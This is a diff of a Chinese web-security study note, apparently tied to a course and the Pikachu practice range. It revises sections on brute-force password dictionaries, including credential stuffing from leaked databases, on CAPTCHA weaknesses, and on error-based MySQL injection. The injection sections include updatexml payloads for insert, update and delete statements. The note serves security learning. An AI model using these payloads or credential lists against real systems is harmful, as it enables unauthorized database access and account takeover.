@@ -30,6 +30,7 @@
         - [案例2-基于information_schema的信息获取](#%E6%A1%88%E4%BE%8B2-%E5%9F%BA%E4%BA%8Einformation_schema%E7%9A%84%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96)
         - [案例3-基于函数报错的信息获取](#%E6%A1%88%E4%BE%8B3-%E5%9F%BA%E4%BA%8E%E5%87%BD%E6%95%B0%E6%8A%A5%E9%94%99%E7%9A%84%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96)
         - [案例4-基于insert、update、delete的注入](#%E6%A1%88%E4%BE%8B4-%E5%9F%BA%E4%BA%8Einsertupdatedelete%E7%9A%84%E6%B3%A8%E5%85%A5)
+    - [相关链接](#%E7%9B%B8%E5%85%B3%E9%93%BE%E6%8E%A5)
 
 <!-- /TOC -->
 # Web安全
@@ -41,11 +42,9 @@
 
 ### 有效的字典
 
-- 弱口令
+- 弱口令，简单的密码，如111111或者123456，常用的账户密码，如admin/root
 - 社工库，已收集的账号密码，比如脱裤收集的，可以撞库
-- 使用指定字符利用工具按照规则生成密码
-- 常用账户密码，如admin/root
-- 遵循注册时的密码要求
+- 遵循注册时的密码要求，使用指定字符利用工具按照规则生成密码
 
 ### 漏洞测试流程
 
@@ -58,11 +57,11 @@
 ### 验证码
 
 - 作用
-    - 登陆暴力破解
+    - 防止登陆时的暴力破解
     - 防止机器恶意注册
 - 认证流程
-    - 登陆页面，后台生成验证码，同时使用算法生成图片，并将图片response给客户端，同时将算法生成的值全局赋值存到 SESSION中
-    - 校验验证码，客户端将认证信息和验证码一同提交，后台对提交的验证码与 SESSION里面的验证码进行比较
+    - 登陆页面，后台生成验证码，同时使用算法生成图片，并将图片 response 给客户端，同时将算法生成的值全局赋值存到 session 中
+    - 校验验证码，客户端将认证信息和验证码一同提交，后台对提交的验证码与 session 里面的验证码进行比较
     - 客户端重新刷新页面，再次生成新的验证码，验证码算法中一般包含随机函数，所以每次刷新都会改变
 - 不安全验证码 - 客户端
     - 使用前端js实现验证码(纸老虎)
@@ -72,7 +71,7 @@
     - 验证码在后台不过期，导致可以长期被使用
     - 验证码校验不严格，逻辑出现问题
     - 验证码设计的太过简单或者有规律，容易被猜解
-    - session？
+    - [session？](https://zhuanlan.zhihu.com/p/164696755)
 
 ### 防范措施
 
@@ -402,7 +401,7 @@ kobe' union select username,password from users#
 ### 案例3-基于函数报错的信息获取
 背景条件：后台没有屏蔽数据库报错信息或者做标准化处理，在语法发生错误时会输出在前端
 - updatexml(xml_document,XpathString,new_value): 是MySQL对XML文档数据进行查询和修改的XPATH函数,XpathString必须是有效的，否则报错
-- extractvalue(): 是MySQL对XML文档数据进行查询的XPATH函数
+- extractvalue(xml_document,XpathString): 是MySQL对XML文档数据进行查询的XPATH函数,XpathString必须是有效的，否则报错
 - floor(): MySQL中用来取整的函数
 
 ```sql
@@ -419,19 +418,25 @@ kobe' and updatexml(1,concat(0x7e,(select table_name from information_schema.tab
 ```
 
 ### 案例4-基于insert、update、delete的注入
+不同于select注入，不能使用union
 ```sql
---正常语句
+--正常语句，insert注入多用在注册类环境下
 insert into users(username,password,id) values('xiaoming',123456,001);
 --使用 ' or …… or ' 拼接
 insert into users(username,password,id) values('xiaoming' or updatexml(1,concat(0x7e,version()),0) or '',123456,001);
 --payload
 xiaoming' or updatexml(1,concat(0x7e,version()),0) or '
 
+--update多用在更新信息环境下
+xiaoming' or updatexml(1,concat(0x7e,version()),0) or ' ----payload，类似于insert
+
+--delete注入
+1 or updatexml(1,concat(0x7e,version()),0) or '
+--正常情况
+delete from message where id = 1;
 ```
 
 
 
-
-```
 ## 相关链接
 [视频教程](https://www.ichunqiu.com/course/63838)[|靶场](https://github.com/zhuifengshaonianhanlu/pikachu)
